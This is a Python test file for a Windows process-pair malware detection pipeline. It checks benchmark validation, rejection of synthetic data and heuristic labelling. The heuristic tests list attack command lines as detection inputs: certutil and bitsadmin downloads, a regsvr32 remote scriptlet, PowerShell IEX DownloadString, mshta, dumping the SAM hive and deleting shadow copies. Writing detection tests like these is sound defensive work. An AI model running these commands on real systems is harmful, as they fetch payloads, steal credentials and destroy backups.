"""Evidence validation and explicitly gated integration tests for real benchmarks."""
from pathlib import Path
import json
import pytest
from src.pipeline.benchmark_builder import BENCHMARKS, build_benchmarks, validate_benchmark
from src.pipeline.baseline_builder import require_production_training
from src.data_loader import DataLoader
from src.pipeline.auto_annotation import ANNOTATION_FIELDS, REVIEWER, classify_pair, generate_annotations




def test_missing_annotation_cannot_create_benchmarks(tmp_path, references):
    annotation = tmp_path / "annotations.csv"
    annotation.write_text("PairId,Benchmark,Label,AnnotationSource,Reviewer\n")
    output = tmp_path / "benchmarks"
    with pytest.raises(ValueError, match="incomplete"):
        build_benchmarks(tmp_path, annotation, output, references)
    assert not list(output.glob("test_*.csv"))


def test_production_training_rejects_fixture_even_with_skip_invalid(test_dataset):
    with pytest.raises(ValueError, match="Synthetic"):
        DataLoader(production=True, strict=False).load(test_dataset)


def test_copied_synthetic_records_rejected(tmp_path):
    path = tmp_path / "copied.json"
    path.write_text(json.dumps([{"EventID": 1, "Computer": "synthetic-stolen", "Image": "x.exe", "CommandLine": "x.exe"}]))
    with pytest.raises(ValueError, match="Synthetic"):
        DataLoader(production=True, strict=False).load(path)


def test_training_accepts_real_eligible_pairs_without_background_evidence(history):
    require_production_training(history)


def test_training_accepts_small_corpus_but_requires_two_pairs(history):
    require_production_training(history[:2])
    with pytest.raises(ValueError, match="at least 2"):
        require_production_training(history[:1])


def test_baseline_rejects_duplicate_execution(history):
    from dataclasses import replace
    pair = replace(history[0], child=replace(history[0].child, metadata={"backgroundevidence": "unit-test-only"}))
    with pytest.raises(ValueError, match="Duplicated"):
        require_production_training([pair, pair])


@pytest.mark.parametrize("name", list(BENCHMARKS))
def test_benchmark_validator_checks_exact_counts_and_signature(tmp_path, references, name):
    """Mock evidence in pytest temp only; this is not the missing real benchmark."""
    import csv
    from datetime import datetime, timezone
    from src.data_loader import ProcessPair, ProcessRecord
    from src.pipeline.pair_schema import pair_row
    rows = []
    parent = ProcessRecord(image="C:\\Windows\\explorer.exe", command_line="explorer.exe", signer="Microsoft Corporation", signature_valid=True)
    from src.pipeline.benchmark_builder import ALLOWED_SOURCES
    malicious, benign = BENCHMARKS[name]
    for index in range(malicious + benign):
        child = ProcessRecord(image="C:\\Windows\\cmd.exe", command_line=f"cmd.exe /c fixture-{index}", utc_time=datetime(2024, 1, 1, tzinfo=timezone.utc), label=-1 if index < malicious else 1)
        row = pair_row(ProcessPair(parent, child))
        row.update(SourceRepo=sorted(ALLOWED_SOURCES[name])[0], SourceSHA256="a" * 64, AnnotationSource="pytest temp ONLY", Reviewer="test")
        rows.append(row)
    path = tmp_path / f"test_{name}.csv"
    with path.open("w", newline="") as stream:
        writer = csv.DictWriter(stream, fieldnames=list(rows[0])); writer.writeheader(); writer.writerows(rows)
    assert validate_benchmark(path, name, references)["samples"] == malicious + benign
    rows[0]["ParentSignatureValid"] = False
    with path.open("w", newline="") as stream:
        writer = csv.DictWriter(stream, fieldnames=list(rows[0])); writer.writeheader(); writer.writerows(rows)
    with pytest.raises(ValueError, match="signature"):
        validate_benchmark(path, name, references)
    rows[0]["ParentSignatureValid"] = True
    rows[0]["Reviewer"] = "Automated_Heuristic_Reviewer"
    with path.open("w", newline="") as stream:
        writer = csv.DictWriter(stream, fieldnames=list(rows[0])); writer.writeheader(); writer.writerows(rows)
    with pytest.raises(ValueError, match="independent ground truth"):
        validate_benchmark(path, name, references)


@pytest.mark.parametrize("binary,command", [
    ("certutil.exe", "certutil.exe -urlcache -f http://example.invalid/a.exe"),
    ("regsvr32.exe", "regsvr32.exe /s /n /u /i:http://example.invalid/a.sct scrobj.dll"),
    ("powershell.exe", "powershell.exe -EncodedCommand SQBFAFgAIAAxAA=="),
    ("pwsh.exe", "pwsh.exe IEX (New-Object Net.WebClient).DownloadString('https://example.invalid')"),
    ("powershell.exe", "powershell.exe -nop -w hidden"),
    ("mshta.exe", "mshta.exe vbscript:GetObject('script:example.invalid')"),
    ("rundll32.exe", r"rundll32.exe C:\Users\Public\payload.dll,Entry"),
    ("wmic.exe", "wmic.exe process call create calc.exe"),
    ("bitsadmin.exe", "bitsadmin.exe /transfer job http://example.invalid C:\\Temp\\a"),
    ("cmd.exe", r"cmd.exe /c copy C:\a.exe C:\a.txt:payload.exe"),
    ("reg.exe", r"reg.exe save HKLM\SAM C:\Temp\sam.bin"),
])
def test_heuristic_suspicious_rules(binary, command):
    from src.data_loader import ProcessRecord, ProcessPair
    parent = ProcessRecord(image=r"C:\Windows\explorer.exe", command_line="explorer.exe")
    child = ProcessRecord(image="C:\\Windows\\System32\\" + binary, command_line=command)
    label, rule = classify_pair(ProcessPair(parent, child))
    assert label == -1 and rule.startswith("T")


def test_benign_rule_is_positive_and_dangerous_parent_takes_precedence():
    from dataclasses import replace
    from src.data_loader import ProcessRecord, ProcessPair
    parent = ProcessRecord(image=r"C:\Windows\services.exe", command_line="services.exe")
    child = ProcessRecord(image=r"C:\Windows\System32\svchost.exe", command_line="svchost.exe -k netsvcs", signer="Microsoft Windows", signature_valid=True)
    assert classify_pair(ProcessPair(parent, child)) == (1, "OS_legitimate_svchost")
    parent = replace(parent, image=r"C:\Windows\powershell.exe", command_line="powershell.exe -enc SQBFAFgAIAAxAA==")
    assert classify_pair(ProcessPair(parent, child))[0] == -1


def test_unmatched_is_abstention_not_automatic_benign():
    from src.data_loader import ProcessRecord, ProcessPair
    pair = ProcessPair(ProcessRecord(image="p.exe", command_line="p.exe"), ProcessRecord(image="unknown.exe", command_line="unknown.exe /x"))
    assert classify_pair(pair)[0] is None


@pytest.fixture
def annotation_raw_manifest(tmp_path):
    """Small checksummed pytest-only raw inputs, never production benchmarks."""
    import csv
    import hashlib
    from datetime import datetime, timezone
    from src.data_loader import ProcessRecord, ProcessPair
    from src.pipeline.pair_schema import pair_row, PAIR_FIELDS
    raw_dir = tmp_path / "data/raw"
    raw_dir.mkdir(parents=True)
    parent = ProcessRecord(image=r"C:\Windows\services.exe", command_line="services.exe", signer="Microsoft Windows", signature_valid=True)
    commands = [("splunk/attack_data", "certutil.exe", "certutil.exe -decode a b"),
                ("OTRF/detection-hackathon-apt29", "svchost.exe", "svchost.exe -k netsvcs"),
                ("OTRF/Security-Datasets", "mshta.exe", "mshta.exe vbscript:Close()")]
    records, items = [], []
    for index, (repo, binary, command) in enumerate(commands):
        child = ProcessRecord(image="C:\\Windows\\System32\\" + binary, command_line=command,
                              process_guid=f"pytest-{index}", computer="pytest-host",
                              utc_time=datetime(2024, 1, 1, tzinfo=timezone.utc), signer="Microsoft Windows", signature_valid=True,
                              metadata={"sourcerepo": repo, "sourcesha256": "a" * 64})
        row = pair_row(ProcessPair(parent, child))
        records.append(row)
        source = raw_dir / f"source-{index}.jsonl"
        source.write_text(json.dumps(row) + "\n")
        items.append({"repo": repo, "path": str(source), "sha256": hashlib.sha256(source.read_bytes()).hexdigest()})
    path = tmp_path / "training.csv"
    with path.open("w", newline="", encoding="utf-8") as stream:
        writer = csv.DictWriter(stream, fieldnames=PAIR_FIELDS)
        writer.writeheader(); writer.writerows(records)
    manifest = raw_dir / "manifest.json"
    manifest.write_text(json.dumps({"items": items}))
    return manifest, path


def test_annotation_generation_preserves_sources_and_reports_shortfall(annotation_raw_manifest, tmp_path, references):
    import csv
    manifest, training = annotation_raw_manifest
    output = tmp_path / "annotations.csv"
    report = generate_annotations(manifest, output, references, allow_source_fallback=True, training_path=training)
    with output.open(newline="", encoding="utf-8") as stream:
        reader = csv.DictReader(stream)
        assert tuple(reader.fieldnames) == ANNOTATION_FIELDS
        annotations = list(reader)
    assert len(annotations) == 3 and len({a["PairId"] for a in annotations}) == 3
    assert all(a["Reviewer"] == REVIEWER for a in annotations)
    proxy = next(a for a in report["allocations"] if a["RequestedBenchmark"] == "botsv1")
    assert proxy["ActualSourceRepo"] == "OTRF/Security-Datasets" and proxy["SourceSubstitution"]
    assert report["training_overlap_annotations"] == 3
    assert not report["quotas_complete"] and not report["holdout_verified"]
    assert not report["independent_ground_truth"]
    checksum = report["annotations_sha256"]
    second = generate_annotations(manifest, output, references, allow_source_fallback=True, training_path=training, overwrite=True)
    assert second["annotations_sha256"] == checksum
    with pytest.raises(ValueError, match="incomplete"):
        build_benchmarks(manifest, output, tmp_path / "benchmarks", references)
    diagnostics = json.loads((tmp_path / "benchmarks/build_report.json").read_text())
    assert diagnostics["unmatched_annotations"] == 0 and not diagnostics["ready"]
    assert not list((tmp_path / "benchmarks").glob("test_*.csv"))


def test_auto_annotations_never_overwrite_human_review(annotation_raw_manifest, tmp_path, references):
    manifest, _ = annotation_raw_manifest
    output = tmp_path / "annotations.csv"
    original = "PairId,Benchmark,Label,AnnotationSource,Reviewer\noriginal,botsv1,1,reviewed,human\n"
    output.write_text(original)
    with pytest.raises(ValueError, match="human-reviewed"):
        generate_annotations(manifest, output, references, overwrite=True)
    assert output.read_text() == original


def test_auto_annotation_builder_requires_matching_sidecar(annotation_raw_manifest, tmp_path, references):
    manifest, _ = annotation_raw_manifest
    output = tmp_path / "annotations.csv"
    generate_annotations(manifest, output, references)
    sidecar = output.with_suffix(".report.json")
    saved = sidecar.read_text()
    sidecar.unlink()
    with pytest.raises(ValueError, match="sidecar"):
        build_benchmarks(manifest, output, tmp_path / "benchmarks", references)
    sidecar.write_text(saved)
    output.write_text(output.read_text().replace("T1105", "CHANGED"))
    with pytest.raises(ValueError, match="checksum"):
        build_benchmarks(manifest, output, tmp_path / "benchmarks", references)


def test_heldout_mining_excludes_training_and_preserves_existing_tests(annotation_raw_manifest, tmp_path, references):
    manifest, training = annotation_raw_manifest
    test_dir = tmp_path / "test"
    test_dir.mkdir()
    existing = test_dir / "test_botsv2.csv"
    existing.write_text("existing reviewed or synthetic test must survive")
    report = generate_annotations(manifest, tmp_path / "heldout.csv", references,
                                  training_path=training, exclude_training=True, test_output=test_dir)
    assert report["counts"]["excluded_training"] == 3
    assert report["heldout_eligible_command_pairs"] == 0 and report["annotations"] == 0
    assert report["training_overlap_annotations"] == 0 and not report["quotas_complete"]
    assert existing.read_text() == "existing reviewed or synthetic test must survive"
    assert len(list(test_dir.glob("test_*.csv"))) == 1


def test_heldout_mining_exports_complete_weak_set_only(annotation_raw_manifest, tmp_path, references):
    import csv
    import hashlib
    from datetime import datetime, timezone
    from src.data_loader import ProcessPair, ProcessRecord
    from src.pipeline.pair_schema import pair_row, command_key
    from src.pipeline.benchmark_builder import rows, decode_pair
    manifest, training = annotation_raw_manifest
    parent = ProcessRecord(image=r"C:\Windows\services.exe", command_line="services.exe",
                           signer="Microsoft Windows", signature_valid=True)
    records = []
    for index in range(24):
        binary, command = (("nslookup.exe", f"nslookup.exe -type=TXT fixture{index}.invalid") if index < 8 else
                           ("svchost.exe", f"svchost.exe -k service-{index}"))
        child = ProcessRecord(image="C:\\Windows\\System32\\" + binary, command_line=command,
                              process_guid=f"pytest-heldout-{index}", computer="pytest-host",
                              utc_time=datetime(2024, 2, 1, tzinfo=timezone.utc), signer="Microsoft Windows", signature_valid=True)
        records.append(pair_row(ProcessPair(parent, child)))
    raw = manifest.parent / "botsv2_unit_only.jsonl"
    raw.write_text("".join(json.dumps(r) + "\n" for r in records))
    content = json.loads(manifest.read_text())
    content["items"].append({"repo": "splunk/botsv2", "path": str(raw), "sha256": hashlib.sha256(raw.read_bytes()).hexdigest()})
    manifest.write_text(json.dumps(content))
    output = tmp_path / "test"
    report = generate_annotations(manifest, tmp_path / "heldout.csv", references,
                                  training_path=training, exclude_training=True, test_output=output)
    target = output / "test_botsv2.csv"
    exported = list(rows(target))
    assert len(exported) == 24 and sum(r["Label"] == "-1" for r in exported) == 8
    assert all(r["LabelKind"] == "heuristic_weak_labels" and r["SourceRepo"] == "splunk/botsv2" for r in exported)
    assert report["test_exports"]["botsv2"]["state"] == "exported_weak_labels"
    assert not report["test_exports_complete"]
    assert not report["quotas_complete"] and len(list(output.glob("test_*.csv"))) == 1
    train_keys = {command_key(decode_pair(r, "training")) for r in rows(training)}
    assert all(command_key(decode_pair(r, "heldout")) not in train_keys for r in exported)
    assert not json.loads(target.with_suffix(".provenance.json").read_text())["independent_ground_truth"]
    checksum = hashlib.sha256(target.read_bytes()).hexdigest()
    second = generate_annotations(manifest, tmp_path / "rerun.csv", references,
                                  training_path=training, exclude_training=True, test_output=output)
    assert second["test_exports"]["botsv2"]["state"] == "existing_output_preserved"
    assert not second["test_exports_complete"]
    assert hashlib.sha256(target.read_bytes()).hexdigest() == checksum
    with pytest.raises(ValueError, match="independent ground truth"):
        validate_benchmark(target, "botsv2", references)


@pytest.mark.parametrize("binary,command,rule", [
    ("nslookup.exe", "nslookup.exe -type=TXT fixture.invalid", "nslookup_dns_txt_query"),
    ("vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", "vssadmin_shadow_deletion"),
])
def test_additional_suspicious_heuristics(binary, command, rule):
    from src.data_loader import ProcessRecord, ProcessPair
    child = ProcessRecord(image="C:\\Windows\\System32\\" + binary, command_line=command)
    assert classify_pair(ProcessPair(ProcessRecord(command_line="services.exe"), child)) == (-1, rule)


def test_normal_directory_listing_abstains_when_shell_operators_added():
    from dataclasses import replace
    from src.data_loader import ProcessRecord, ProcessPair
    parent = ProcessRecord(command_line="explorer.exe")
    child = ProcessRecord(image=r"C:\Windows\System32\cmd.exe", command_line="cmd.exe /c dir",
                          signer="Microsoft Windows", signature_valid=True)
    assert classify_pair(ProcessPair(parent, child)) == (1, "OS_read_only_cmd_dir")
    assert classify_pair(ProcessPair(parent, replace(child, command_line="cmd.exe /c dir>output.txt")))[0] is None


